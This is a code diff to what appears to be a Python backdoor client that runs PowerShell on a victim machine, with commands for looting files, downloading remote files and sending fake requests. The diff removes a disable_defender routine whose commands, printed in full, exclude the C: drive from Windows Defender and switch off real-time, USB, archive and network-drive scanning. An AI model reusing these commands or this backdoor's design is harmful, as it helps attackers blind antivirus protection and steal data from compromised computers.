@@ -41,7 +41,8 @@ POWERSHELL_SCRIPT_OBJECTS: list = [
     "waitForConnection",
     "nothingtolookatreally",
     "BackdoorManager",
-    "createTextStream"
+    "createTextStream",
+    "command"
 ]
 
 class Client:
@@ -60,7 +61,6 @@ class Client:
             "get_bios":self.get_bios,
             "get_antivirus":self.get_antivirus,
             "get_active": self.get_active,
-            "disable_defender": self.disable_defender
         }
 
     def run_powershell_command(self, command: str, print_result: bool = True) -> None:
@@ -112,24 +112,6 @@ class Client:
         command = "Get-MpComputerStatus | Select AntivirusEnabled, AMEngineVersion, AMProductVersion, AMServiceEnabled, AntispywareSignatureVersion, AntispywareEnabled, IsTamperProtected, IoavProtectionEnabled, NISSignatureVersion, NISEnabled, QuickScanSignatureVersion, RealTimeProtectionEnabled, OnAccessProtectionEnabled, DefenderSignaturesOutOfDate | Out-String"
         self.run_powershell_command(command)
 
-    def disable_defender(self, command = None) -> None:
-        """ Attempts to disable windows defender
-        """
-        commands = [
-            # Exclude all directories from Windows AV
-            "Set-MpPreference -ExclusionPath C:",
-            # Disable Realtime Scanning & Monitoring
-            "Set-MpPreference -DisableRealtimeMonitoring $true"
-            # Disables Scanning USB's for malware
-            "Set-MpPreference -DisableRemovableDriveScanning $true"
-            # Disables Scanning Archives
-            "Set-MpPreference -DisableArchiveScanning $true"
-            # Disables scanning network drives
-            "MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true"
-        ]
-        for command in commands:
-            self.run_powershell_command(command)
-
     def print_help(self, command = None):
         print("""
 Command         Description
@@ -143,7 +125,6 @@ get_loot         - Searches a directory for intresting files (May take awhile) .
 get_tools        - Checks to see what tools are installed on the system
 get_file         - Downloads a remote file and saves it to your computer ... Syntax: get_file <REMOTE_FILE> <LOCAL_FILE>
 get_users        - Lists all users on the local computer
-disable_defender - Attempts to disable windows defender with various methods (Requires Admin Priv)
     """)
         self.__send_fake_request()
 
